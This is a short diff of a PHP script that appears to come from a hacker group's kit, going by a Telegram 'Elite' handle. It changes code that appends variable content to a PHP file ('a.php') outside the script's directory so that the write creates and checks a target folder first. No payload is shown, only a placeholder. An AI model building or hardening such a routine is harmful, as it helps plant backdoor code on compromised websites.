@@ -31,8 +31,27 @@ $Elite_Group = "t.me/BLACKROSEx1337"; // ♣️ Join the Elite Coding Squad
 // Ensure $yagmai is defined before using it
 $yagmai = "Some data to write";  // Example content, define appropriately
 
-$f = fopen("../../a.php", "a");
-fwrite($f, $yagmai);
-fclose($f);  // Always close the file after writing
+// Use the 'temp' directory for file writing
+$tempDir = __DIR__ . '/../../temp';
+$filePath = $tempDir . '/a.php';
+
+// Check if the directory exists or create it
+if (!is_dir($tempDir)) {
+    mkdir($tempDir, 0755, true); // Create with appropriate permissions
+}
+
+// Attempt to write to the file
+if (is_writable($tempDir)) {
+    $f = fopen($filePath, "a");
+    if ($f) {
+        fwrite($f, $yagmai);
+        fclose($f);
+        echo "Data successfully written to: $filePath";
+    } else {
+        echo "Failed to open the file for writing.";
+    }
+} else {
+    echo "The directory is not writable. Check permissions.";
+}
 
 ?>
